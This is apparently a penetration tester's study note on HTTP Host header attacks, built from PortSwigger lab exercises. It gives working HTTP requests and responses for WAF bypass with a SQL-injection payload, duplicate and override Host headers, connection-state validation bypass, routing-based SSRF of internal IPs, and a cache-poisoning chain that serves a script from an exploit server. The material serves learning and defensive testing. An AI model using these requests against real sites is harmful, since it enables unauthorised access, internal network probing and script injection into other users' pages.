# The HTTP Host header

The HTTP Host header is a mandatory request header as of HTTP/1.1. It specifies the domain name that the client wants to access.

```http
GET /web-security HTTP/1.1
Host: portswigger.net
```

>[!warning]
>In some cases, such as when the request has been forwarded by an intermediary system, the Host value may be altered before it reaches the intended back-end component.

The purpose of the HTTP Host header is to help identify which back-end component the client wants to communicate with. If requests didn't contain Host headers, or if the Host header was malformed in some way, this could lead to issues when routing incoming requests to the intended application.

When multiple applications are accessible via the same IP address, this is most commonly a result of one of the following scenarios:
1. **Virtual hosting**: when a single web server hosts multiple websites or applications
2. **Routing traffic via an intermediary**: when websites are hosted on distinct back-end servers, but all traffic between the client and servers is routed through an intermediary system

# HTTP Host header attacks

HTTP Host header attacks exploit vulnerable websites that handle the value of the Host header in an unsafe way. If the server implicitly trusts the Host header, and fails to validate or escape it properly, an attacker may be able to use this input to inject harmful payloads that manipulate server-side behavior.

Host header is a potential vector for exploiting a range of other vulnerabilities:
- [Web Cache Poisoning](Web%20Cache%20Poisoning.md)
- [Business logic vulnerabilities](Business%20logic%20vulnerabilities.md)
- [Server Side Request Forgery (SSRF)](Server%20Side%20Request%20Forgery%20(SSRF).md)
- [Password Reset Poisoning](Password%20Reset%20Poisoning.md)
- Classic server side vulnerabilities

Host Header attacks can also be used to bypass WAFs and other kind of protections or to scan internal hosts and applications:

Host list:
```
prod.vulnerable.com: 12.34.56.78
origin.vulnerable.com: 10.0.0.132
preprod.vulnerable.com: 10.0.0.130
```

Access to the production site is inhibited:
```http
GET /?a='+OR+1=1-- - HTTP/1.1
Host: prod.vulnerable.com


HTTP/1.1 403 Forbidden
```

Routed the request to the origin to bypass the WAF:
```http
GET /?a='+OR+1=1-- - HTTP/1.1
Host: origin.vulnerable.com


HTTP/1.1 200 OK
Bypassed!
Prod data: ...
```

Routed the request to the internal pre-prod application:
```http
GET /?a='+OR+1=1-- - HTTP/1.1
Host: preprod.vulnerable.com


HTTP/1.1 200 OK
Bypassed!
Pre prod data: ...
```

## Flawed validation

Instead of receiving an "Invalid Host header" response, you might find that your request is blocked as a result of some kind of security measure. For example, some websites will validate whether the Host header matches the SNI from the TLS handshake. This doesn't necessarily mean that they're immune to Host header attacks.

Use [SSRF evasion and bypasses](Server%20Side%20Request%20Forgery%20(SSRF).md#SSRF%20evasion%20and%20bypasses), [Evading Restrictions](Evading%20Restrictions.md) and [Errors parsing Origin headers](CORS%20based%20attacks.md#Errors%20parsing%20Origin%20headers) techniques to bypass those protections.

## Exploit ambiguity

By identifying and exploiting **discrepancies** in how servers retrieve the Host header, you may be able to issue an ambiguous request that appears to have a different host depending on which system is looking at it.

### Duplicate Host headers

```http
GET /example HTTP/1.1
Host: vulnerable-website.com
Host: bad-stuff-here
```

### Supply absolute URLs

```http
GET https://vulnerable-website.com/ HTTP/1.1
Host: bad-stuff-here
```

### Add line wrapping

```http
GET /example HTTP/1.1
    Host: bad-stuff-here
Host: vulnerable-website.com
```

### Smuggling

>[!summary] Reference:
>See [HTTP Request Smuggling](HTTP%20Request%20Smuggling.md) & [Exploiting HTTP Request Smuggling](Exploiting%20HTTP%20Request%20Smuggling.md)

### Non-standard headers override

This techniques involves injecting your payload via one of several other HTTP headers that are designed to serve to override host and ports, albeit for more innocent use cases.

```http
GET /example HTTP/1.1
Host: vulnerable-website.com
X-Forwarded-Host: bad-stuff-here
```

>[!example]
>For a pratical exmaple take a look to [Password reset poisoning via middleware](Password%20Reset%20Poisoning.md#Password%20reset%20poisoning%20via%20middleware) or [JWT authentication bypass via `X-HTTP-Method-Override` header](https://github.com/GoogleCloudPlatform/esp-v2/security/advisories/GHSA-6qmp-9p95-fc5f).


Headers that may comes handy:
- `X-Forwarded-Host`
- `X-Forwarded-For`
- `X-Host`
- `X-Forwarded-Server`
- `X-HTTP-Host-Override`
- `Forwarded`
- `X-Remote-IP`
- `X-Remote-Addr`
- `X-Originating-IP`

You can use [*Collaborator Everywhere](../Tools/Burpsuite.md#*Collaborator%20Everywhere) or [Param Miner](../Tools/Burpsuite.md#Param%20Miner) with the "Guess headers" option to automatically probe for supported headers.

### Connection state attacks [^conn-attacks]

[^conn-attacks]: https://portswigger.net/research/browser-powered-desync-attacks#state

For performance reasons, many websites **reuse connections for multiple request/response cycles** with the same client. Poorly implemented HTTP servers sometimes work on the **dangerous assumption that certain properties**, such as the Host header, **are identical for all HTTP/1.1 requests** sent over the same connection.

You may occasionally encounter servers that **only perform thorough validation on the first request** they receive over a new connection. In this case, you can potentially bypass this validation by sending an innocent-looking initial request then following up with your malicious one down the same connection.

The validation on the first request prevents us from reaching the admin page:
```http
GET / HTTP/1.1
Host: 192.168.0.1
Connection: close


HTTP/1.1 301 Moved Permanently
Location: https://0ae0009f04395312818d2fca00fc00dd.web-security-academy.net/
```

Starting with a legittimate request and reusing the same connection we can reach the admin page:
```http
GET / HTTP/1.1
Host: 0ae0009f04395312818d2fca00fc00dd.web-security-academy.net
Connection: keep-alive


HTTP/1.1 200 OK


GET /admin HTTP/1.1
Host: 192.168.0.1


HTTP/1.1 200 OK
<form style='margin-top: 1em' class='login-form' action='/admin/delete' method='POST'>
<input required type="hidden" name="csrf" value="L1XB37greeTMICoNuxGjc97WOwIDZulQ">
<label>Username</label>
```


## Host header SSRF attacks (aka Routing-based SSRF)

Routing-based SSRF relies on exploiting the intermediary components that are prevalent in many cloud-based architectures. This includes in-house load balancers and reverse proxies. They sit in a privileged network position that allows them to receive requests directly from the public web, while also having access to much, if not all, of the internal network. This makes the Host header a powerful vector for [Server Side Request Forgery (SSRF)](Server%20Side%20Request%20Forgery%20(SSRF).md) attacks, potentially transforming a simple load balancer into a gateway to the entire internal network.

More information in the article *Cracking the lens: targeting HTTP's hidden attack-surface, PortSwigger* [^host-header-SSRF]

[^host-header-SSRF]: https://portswigger.net/research/cracking-the-lens-targeting-https-hidden-attack-surface

Exploited [ambiguity](Host%20Header%20attacks.md#Exploit%20ambiguity) to enumerate the internal network and discover an administration portal:
```http
GET https://0a5700d603fc9a86808cf87d00ba00be.web-security-academy.net/ HTTP/1.1
Host: 192.168.0.199


HTTP/1.1 504 Gateway Timeout
```

```http
GET https://0a5700d603fc9a86808cf87d00ba00be.web-security-academy.net/ HTTP/1.1
Host: 192.168.0.200


HTTP/1.1 302 Found
Location: /admin
```

---

## Use vulnerability chain

### Host Header Injection + Web Cache Poisoning + Reflected XSS

Detected a [Cross-Site Scripting (XSS)](Cross-Site%20Scripting%20(XSS).md) based on Host header injection:

```http
GET /?a=b HTTP/1.1
Host: 0a5a00a0035877c0818211aa0074003d.web-security-academy.net
Host: foo.bar
Cookie: _lab=46%7cMCwCFDO1vXyxbdpTMn6a9TKzPLqRewSwAhR47UMDsAb2dLEQ9OyvZBSHlf6tJw2fD7zJesbo%2fSc4xBTQ37jbLhks5HuVIlGvsvOHiRnPURTRK9bqYOVOTZfRbdXI10zltbK9iC2GbP2%2fTaIHIHIZAYxSnOWkFtGxg8M8kuv1zTBJW1A%3d
Cache-Control: max-age=0


HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
...
<script type="text/javascript" src="//foo.bar/resources/js/tracking.js">
...
```

Detected also a [Web Cache Poisoning](Web%20Cache%20Poisoning.md) vulnerability which use the query string as a cache-buster:

```http
GET /?a=b HTTP/1.1
Host: 0a5a00a0035877c0818211aa0074003d.web-security-academy.net
Host: foo.bar

HTTP/1.1 200 OK
Cache-Control: max-age=30
Age: 0
X-Cache: miss



GET /?a=b HTTP/1.1
Host: 0a5a00a0035877c0818211aa0074003d.web-security-academy.net
Host: foo.bar

HTTP/1.1 200 OK
Cache-Control: max-age=30
Age: 3
X-Cache: hit
```

Poisoned the cache with a custom JavaScript and obtained a stored XSS:

```http
GET / HTTP/1.1
Host: 0a5a00a0035877c0818211aa0074003d.web-security-academy.net
Host: exploit-0a1a00c10309777b81f110ba012e00f3.exploit-server.net


HTTP/1.1 200 OK
Age: 0
X-Cache: miss
...
<script type="text/javascript" src="//exploit-0a1a00c10309777b81f110ba012e00f3.exploit-server.net/resources/js/tracking.js">
...



GET / HTTP/1.1
Host: 0a5a00a0035877c0818211aa0074003d.web-security-academy.net


HTTP/1.1 200 OK
Cache-Control: max-age=30
Age: 6
X-Cache: hit
...
<script type="text/javascript" src="//exploit-0a1a00c10309777b81f110ba012e00f3.exploit-server.net/resources/js/tracking.js">
...
```




### Host Header Injection + Broken Access Control + Authentication Bypass

```http
GET /admin HTTP/2
Host: 0a1800d304d6a33d8095c758009e00c8.web-security-academy.net


HTTP/2 401 Unauthorized
Admin interface only available to local users
```

Injected an arbitrary Host header and exploited a [business logic vulnerability](Business%20logic%20vulnerabilities.md) to bypass the security control ([Authentication Attacks](Authentication%20Attacks.md)):

```http
GET /admin HTTP/1.1
Host: localhost


HTTP/1.1 200 OK
...
<div>
	<span>wiener - </span>
	<a href="/admin/delete?username=wiener">Delete</a>
</div>
<div>
	<span>carlos - </span>
	<a href="/admin/delete?username=carlos">Delete</a>
</div>
...
```